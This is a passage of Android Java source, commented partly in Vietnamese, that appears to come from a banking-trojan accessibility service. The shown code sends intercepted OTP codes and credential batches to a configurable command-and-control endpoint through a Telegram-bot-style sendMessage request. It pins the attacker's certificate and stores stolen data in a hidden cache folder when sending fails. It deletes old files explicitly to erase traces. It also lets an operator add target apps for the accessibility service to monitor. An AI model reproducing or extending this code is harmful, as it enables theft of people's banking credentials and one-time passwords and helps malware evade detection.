                    xoaFileLocalCu();
                } else {
                    luuLocal(batch, "creds_");
                }
            } catch (Exception e) {
                luuLocal(batch, "creds_");
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }

    private void guiOtpLenC2(List<String> otpBatch) {
        String c2Url = layCauHinh("c2_url", "");
        String botToken = layCauHinh("bot_token", "");
        String chatId = layCauHinh("chat_id", "");

        if (c2Url.isEmpty() || botToken.isEmpty() || chatId.isEmpty()) {
            luuLocal(otpBatch, "otp_");
            return;
        }

        executor.submit(() -> {
            HttpsURLConnection conn = null;
            try {
                JSONObject payload = new JSONObject();
                payload.put("chat_id", chatId);
                payload.put("text", "OTP:\n" + TextUtils.join("\n", otpBatch));

                URL url = new URL(c2Url + botToken + "/sendMessage");
                conn = taoHttpsConnectionPinCert(url);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }

                if (conn.getResponseCode() != 200) {
                    luuLocal(otpBatch, "otp_");
                }
            } catch (Exception e) {
                luuLocal(otpBatch, "otp_");
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }

    // TLS 1.3 + Cert Pinning
    private HttpsURLConnection taoHttpsConnectionPinCert(URL url) throws Exception {
        SSLContext sslContext = SSLContext.getInstance("TLSv1.3");
        TrustManager[] pinningManagers = new TrustManager[]{
            new X509TrustManager() {
                @Override
                public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                @Override
                public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                    try {
                        for (X509Certificate cert : chain) {
                            String sha256 = Base64.encodeToString(
                                MessageDigest.getInstance("SHA-256").digest(cert.getEncoded()),
                                Base64.NO_WRAP);
                            for (String pin : C2_PINNED_CERTS) {
                                if (pin.contains(sha256)) return;
                            }
                        }
                    } catch (Exception e) {
                        throw new CertificateException("Certificate pinning failed", e);
                    }
                    throw new CertificateException("Certificate not pinned");
                }
                @Override
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            }
        };
        sslContext.init(null, pinningManagers, new SecureRandom());
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        conn.setSSLSocketFactory(sslContext.getSocketFactory());
        return conn;
    }

    // Local storage fallback
    private void luuLocal(List<String> batch, String prefix) {
        try {
            File dir = new File(ctx.getFilesDir(), ".cache");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, prefix + System.currentTimeMillis() + ".enc");
            try (FileOutputStream fos = new FileOutputStream(file)) {
                for (String item : batch) {
                    fos.write((item + "\n").getBytes(StandardCharsets.UTF_8));
                }
            }
        } catch (Exception ignored) {}
    }

    // FIX 6: Tự động xóa file local cũ để xóa dấu vết
    private void xoaFileLocalCu() {
        try {
            File dir = new File(ctx.getFilesDir(), ".cache");
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            long cutoff = System.currentTimeMillis() - 3600000; // Xóa file cũ hơn 1 giờ
            for (File f : files) {
                if (f.lastModified() < cutoff) {
                    f.delete();
                }
            }
        } catch (Exception ignored) {}
    }

    // ============================================================
    // CLEANUP - FIX 7 (ĐẢM BẢO UNREGISTER)
    // ============================================================
    private void cleanupResources() {
        try {
            if (healthCheckTimer != null) {
                healthCheckTimer.cancel();
                healthCheckTimer.purge();
            }
            if (credentialFlushTimer != null) {
                credentialFlushTimer.cancel();
                credentialFlushTimer.purge();
            }

            // Unregister receivers an toàn
            try {
                if (smsReceiver != null) unregisterReceiver(smsReceiver);
            } catch (Exception ignored) {}
            try {
                if (restartReceiver != null) unregisterReceiver(restartReceiver);
            } catch (Exception ignored) {}

            // Remove clipboard listener
            try {
                if (clipboardListener != null && clipboardManager != null) {
                    clipboardManager.removePrimaryClipChangedListener(clipboardListener);
                }
            } catch (Exception ignored) {}

            // Flush queue cuối cùng
            flushQueues();

            // Shutdown thread pool
            if (executor != null && !executor.isShutdown()) {
                executor.shutdown();
                try { executor.awaitTermination(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
            }

            if (workerThread != null && workerThread.isAlive()) {
                workerThread.quitSafely();
                try { workerThread.join(2000); } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    // ============================================================
    // PUBLIC API
    // ============================================================
    public boolean isServiceRunning() {
        return serviceRunning.get();
    }

    public void setC2Config(String url, String token, String chatId) {
        luuCauHinh("c2_url", url);
        luuCauHinh("bot_token", token);
        luuCauHinh("chat_id", chatId);
    }

    public void addTargetApp(String packageName, String appName) {
        targetApps.put(packageName, appName);
        targetPackageSet.add(packageName);
        try {
            AccessibilityServiceInfo info = getServiceInfo();
            info.packageNames = targetApps.keySet().toArray(new String[0]);
            setServiceInfo(info);
        } catch (Exception ignored) {}
    }
}